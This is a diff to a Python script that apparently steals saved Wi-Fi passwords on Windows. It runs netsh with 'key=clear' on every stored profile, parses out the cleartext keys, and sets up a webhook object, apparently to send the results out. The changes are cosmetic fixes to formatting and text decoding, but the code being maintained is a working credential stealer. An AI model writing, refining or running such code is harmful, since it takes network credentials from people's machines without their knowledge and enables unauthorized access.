@@ -14,6 +14,7 @@ import colorama
 from colorama import Fore, Back, Style
 from colorama import init
 from termcolor import colored
+
 colorama.init(autoreset=True)
 
 # ---------- Title of the project // Bar to beautify the UI ----------
@@ -40,7 +41,7 @@ hook = Webhook(Webhook1)
 
 # ---------- Commands to find out the Wlan passwords and connections ----------
 
-command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
 
 profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
 
@@ -51,7 +52,8 @@ if len(profile_names) != 0:
 
         wifi_profile = {}
 
-        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode(
+            'windows-1252')
 
         if re.search("Security key           : Absent", profile_info):
             continue
@@ -59,9 +61,12 @@ if len(profile_names) != 0:
 
             wifi_profile["Wifi"] = name
 
-            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
+            profile_info_pass = subprocess.run(
+                ["netsh", "wlan", "show", "profile", name, "key=clear"],
+                capture_output=True
+            ).stdout.decode(errors='ignore')
 
-# ---------- Convert the output to a variable ----------
+            # ---------- Convert the output to a variable ----------
 
             password = re.search("Key Content            : (.*)\r", profile_info_pass)
 
@@ -97,4 +102,3 @@ print(f"""{Fore.GREEN}
 """)
 input("""
  """)
-
